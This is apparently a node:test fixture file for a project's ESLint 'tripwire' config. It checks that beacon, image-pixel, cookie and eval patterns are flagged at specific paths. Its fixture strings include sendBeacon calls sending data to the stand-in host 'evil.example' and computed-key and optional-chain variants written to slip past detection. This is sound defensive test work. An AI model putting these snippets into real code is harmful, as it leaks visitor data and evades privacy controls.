// Fixture tests for the ESLint tripwire in eslint.config.js. Each case lints a deliberately bad snippet
// as if it lived at a real path (the config is path-based), so a loosened rule fails here, not in review.
// Run: node --test scripts/check-tripwire.test.mjs   (also part of `npm test`).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { ESLint } from 'eslint';

const ROOT = new URL('../', import.meta.url).pathname;
const eslint = new ESLint({ cwd: ROOT });
const errors = async (code, file) => (await eslint.lintText(code, { filePath: ROOT + file })).flatMap((r) => r.messages).filter((m) => m.severity === 2);

// The real send.js is the one visitor-path file allowed to reference the unload beacon.
test('send.js (the one allowed sender) passes, including its globalThis.navigator beacon', async () => {
  const send = fs.readFileSync(ROOT + 'packages/doorway/src/send.js', 'utf8');
  assert.match(send, /sendBeacon/, 'fixture premise: send.js does use the beacon');
  assert.deepEqual(await errors(send, 'packages/doorway/src/send.js'), []);
});

// send.js may reference the beacon once (the unload record). Anything else added to it is caught.
const SEND_LEAKS = {
  'a second beacon call': "export const leak = () => navigator.sendBeacon('https://evil.example', 'q');",
  'a globalThis.navigator call': "export const leak = () => globalThis.navigator.sendBeacon('https://evil.example', 'q');",
  'a string-keyed access': "export const leak = () => navigator['sendBeacon'];",
  'a reference through another object': "export const leak = (w) => w.navigator.sendBeacon;",
};
for (const [name, code] of Object.entries(SEND_LEAKS)) {
  test(`send.js: ${name} is caught (only the one unload reference is allowed)`, async () => {
    const send = fs.readFileSync(ROOT + 'packages/doorway/src/send.js', 'utf8');
    assert.ok((await errors(send + '\n' + code, 'packages/doorway/src/send.js')).length > 0, 'not caught');
  });
}

const BEACON_LEAKS = {
  'globalThis.navigator?.sendBeacon (optional chain)': "export const leak = () => globalThis.navigator?.sendBeacon('https://evil.example', 'q');",
  'window.navigator.sendBeacon': "export const leak = () => window.navigator.sendBeacon('https://evil.example', 'q');",
  'computed string key': "export const leak = () => navigator['sendBeacon']('https://evil.example', 'q');",
  'member of a plain variable': "export const leak = (n) => n.sendBeacon('https://evil.example', 'q');",
};
for (const file of ['packages/doorway/src/widget.js', 'packages/doorway/src/loader.js', 'packages/core/src/counter.js', 'edge/c.js']) {
  for (const [name, code] of Object.entries(BEACON_LEAKS)) {
    test(`beacon leak "${name}" is caught in ${file}`, async () => {
      assert.ok((await errors(code, file)).length > 0, 'not caught');
    });
  }
}

test('the edge rule set still applies to edge/c.js (no blanket off): an img element and a src assignment are caught', async () => {
  assert.ok((await errors("export const x = (d) => d.createElement('img');", 'edge/c.js')).length > 0);
  assert.ok((await errors("export const x = (i) => { i.src = 'https://evil.example/p.gif'; };", 'edge/c.js')).length > 0);
});

test('tests are not a free-for-all: a new Image() in a spec other than network.spec is caught', async () => {
  assert.ok((await errors("export const x = () => new Image();", 'test/e2e/door.spec.js')).length > 0);
});

test('network.spec.js keeps its named evidence exceptions: Image and the cookie jar, but not beacons', async () => {
  assert.deepEqual(await errors("export const x = () => new Image();", 'test/e2e/network.spec.js'), []);
  assert.deepEqual(await errors("export const x = (d) => d.cookie;", 'test/e2e/network.spec.js'), []);
  assert.ok((await errors("export const x = () => navigator.sendBeacon('u', 'd');", 'test/e2e/network.spec.js')).length > 0);
});

test('a test that writes document.cookie is caught (only network.spec.js may read it)', async () => {
  assert.ok((await errors("export const x = () => { document.cookie = 'a=1'; };", 'test/e2e/door.spec.js')).length > 0);
});

test('scripts/ are linted with the eval rules', async () => {
  assert.ok((await errors("export const x = (s) => eval(s);", 'scripts/example.mjs')).length > 0);
});
